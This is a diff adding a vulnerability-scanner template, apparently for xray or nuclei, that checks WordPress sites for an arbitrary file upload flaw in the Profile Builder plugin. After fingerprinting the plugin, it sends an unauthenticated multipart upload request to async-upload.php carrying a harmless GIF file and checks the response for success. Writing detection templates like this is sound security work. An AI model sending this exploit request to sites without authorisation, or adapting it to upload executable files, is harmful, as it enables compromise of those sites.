@@ -1,0 +1,47 @@
+name: wordpress profile builder arbitrary fileupload
+rules:
+  - method: GET
+    path: /
+    headers:
+      Host: "{{Hostname}}"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"/plugins/profile-builder")
+    log: |
+      Request: GET / HTTP/1.1
+      Host: {{Hostname}}
+      Response Status: {{response.status}}
+      Response Body: {{response.body}}
+
+  - method: POST
+    path: /wp-admin/async-upload.php
+    headers:
+      Host: "{{Hostname}}"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+    body: |
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="wppb_upload"
+
+      true
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="meta_name"
+
+      {{filename}}.gif
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="_wpnonce"
+
+      e8
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="action"
+
+      upload-attachment
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="async-upload"; filename="{{filename}}.gif"
+      Content-Type: image/jpeg
+
+      GIF89a
+
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'"id"') && response.body.bcontains(b'"uploadedTo"') && response.headers['Content-Type'].contains('text/plain')
+severity: high
+type: fileupload
